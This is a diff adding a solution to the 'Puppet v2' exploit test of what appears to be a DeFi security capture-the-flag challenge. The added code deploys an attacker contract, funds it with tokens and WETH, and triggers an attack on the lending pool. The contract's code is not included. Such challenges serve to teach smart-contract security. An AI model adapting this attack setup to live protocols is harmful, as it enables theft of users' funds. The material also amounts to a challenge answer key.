@@ -81,8 +81,33 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        /** 
+         * This test simulates an exploit of the PuppetV2 lending pool.
+         * It deploys the attacker contract, transfers tokens and ETH, and performs the attack.
+         */
+    
+        // Deploy the attacker contract with the necessary parameters
+        const attackerContract = await (await ethers.getContractFactory('PuppetV2Attacker', attacker)).deploy(
+            this.uniswapRouter.address,
+            this.lendingPool.address,
+            this.token.address,
+            this.weth.address
+        );
+    
+        // Transfer initial DVT tokens to the attacker contract
+        await this.token.connect(attacker).transfer(attackerContract.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+    
+        // Convert ETH to WETH
+        const ethAmt = ethers.utils.parseEther('19.9');
+        await this.weth.connect(attacker).deposit({ value: ethAmt });
+        
+        // Transfer WETH to the attacker contract
+        await this.weth.connect(attacker).transfer(attackerContract.address, ethAmt);
+    
+        // Execute the attack
+        await attackerContract.attack();
     });
+    
 
     after(async function () {
         /** SUCCESS CONDITIONS */
